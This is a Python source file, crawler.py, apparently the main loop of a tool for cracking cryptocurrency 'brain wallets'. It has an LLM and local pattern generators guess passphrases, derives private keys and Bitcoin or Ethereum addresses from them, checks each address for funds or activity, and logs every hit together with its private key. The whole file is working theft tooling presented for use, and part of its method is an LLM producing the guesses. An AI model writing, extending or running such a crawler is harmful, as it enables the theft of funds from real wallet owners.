# language: Python, file: crawler.py
# main crawler loop — threading, queue, derive-check pipeline

import time
import threading
from queue import Queue, Empty

from config import TARGET_CHAIN, THREADS, LOG_FILE, QUEUE_TIMEOUT, ROUND_DELAY, CANDIDATES_PER_BATCH
from crypto.derivation import passphrase_to_private_key, private_key_to_wif, private_key_to_public_key_bytes
from crypto.chains import btc_all_addresses, private_key_to_eth_address
from llm.generator import generate_candidates_llm
from local_gen.patterns import generate_candidates_local
from checker.balance import BalanceChecker
from checker.reporter import report_hit, report_progress

_stop_event = threading.Event()


def derive_and_check(passphrase: str, checker: BalanceChecker, chain: str) -> bool:
    """derive all address types from passphrase, check each for balance/activity"""
    priv = passphrase_to_private_key(passphrase)
    if priv == 0:
        return False

    wif = private_key_to_wif(priv, compressed=True)

    if chain == "BTC":
        pub_c = private_key_to_public_key_bytes(priv, compressed=True)
        pub_u = private_key_to_public_key_bytes(priv, compressed=False)
        addresses = btc_all_addresses(pub_c, pub_u, testnet=False)

        for addr in addresses:
            info = checker.check(addr)
            if info and (info.get("balance_sats", 0) > 0 or info.get("total_received_sats", 0) > 0):
                report_hit(passphrase, priv, wif, addr, info, chain, LOG_FILE)
                return True

    elif chain == "ETH":
        addr = private_key_to_eth_address(priv)
        info = checker.check(addr)
        if info and (info.get("balance_wei", 0) > 0 or info.get("tx_count", 0) > 0):
            report_hit(passphrase, priv, wif, addr, info, chain, LOG_FILE)
            return True

    return False


def crawler_worker(queue: Queue, checker: BalanceChecker, chain: str,
                   results: list, results_lock: threading.Lock):
    """worker thread — pull passphrase, derive, check"""
    local_count = 0
    while not _stop_event.is_set():
        try:
            passphrase = queue.get(timeout=QUEUE_TIMEOUT)
        except Empty:
            break

        if passphrase is None:
            queue.task_done()
            break

        try:
            if derive_and_check(passphrase, checker, chain):
                with results_lock:
                    results.append(passphrase)
        except Exception as e:
            print(f"[!] worker error: {e}")

        local_count += 1
        queue.task_done()


def run_crawler(context: str, seed_words: list = None, chain: str = TARGET_CHAIN,
                max_rounds: int = 0):
    """main loop — generate → queue → process → check → repeat"""
    seed_words = seed_words or []
    print(f"[*] wallet key crawler starting")
    print(f"    chain:      {chain}")
    print(f"    model:      config.MODEL")
    print(f"    threads:    {THREADS}")
    print(f"    context:    {context[:100]}{'...' if len(context) > 100 else ''}")
    if seed_words:
        print(f"    seed words: {', '.join(seed_words)}")
    print(f"    log file:   {LOG_FILE}")
    print()

    checker = BalanceChecker(chain)
    results = []
    results_lock = threading.Lock()
    total_checked = 0
    round_num = 0
    all_tried = set()  # global dedup across rounds

    while not _stop_event.is_set():
        round_num += 1
        if max_rounds > 0 and round_num > max_rounds:
            print(f"[*] max rounds ({max_rounds}) reached — stopping")
            break

        print(f"[*] round {round_num} — generating candidates...")

        # LLM generation
        llm_candidates = generate_candidates_llm(seed_words, context, CANDIDATES_PER_BATCH)
        print(f"    LLM candidates:   {len(llm_candidates)}")

        # local generation
        local_words = seed_words if seed_words else context.split()
        local_candidates = generate_candidates_local(local_words, CANDIDATES_PER_BATCH)
        print(f"    local candidates: {len(local_candidates)}")

        # deduplicate against everything tried so far
        new_candidates = []
        for c in set(llm_candidates + local_candidates):
            if c.lower() not in all_tried:
                all_tried.add(c.lower())
                new_candidates.append(c)

        print(f"    new unique:       {len(new_candidates)}")

        if not new_candidates:
            print("[*] no new candidates — expanding search...")
            time.sleep(ROUND_DELAY)
            continue

        # queue and process
        q = Queue()
        for c in new_candidates:
            q.put(c)
        # sentinel for each worker
        for _ in range(THREADS):
            q.put(None)

        threads = []
        for _ in range(THREADS):
            t = threading.Thread(
                target=crawler_worker,
                args=(q, checker, chain, results, results_lock),
                daemon=True
            )
            t.start()
            threads.append(t)

        # wait for all workers
        for t in threads:
            t.join()

        total_checked += len(new_candidates)
        report_progress(round_num, total_checked, len(results), checker.check_count)

        if results:
            print(f"\n[★] {len(results)} hit(s) — check {LOG_FILE}")
            break

        time.sleep(ROUND_DELAY)

    print(f"[*] crawler finished | total checked: {total_checked} | hits: {len(results)}")
    return results


def stop_crawler():
    """signal all workers to stop"""
    _stop_event.set()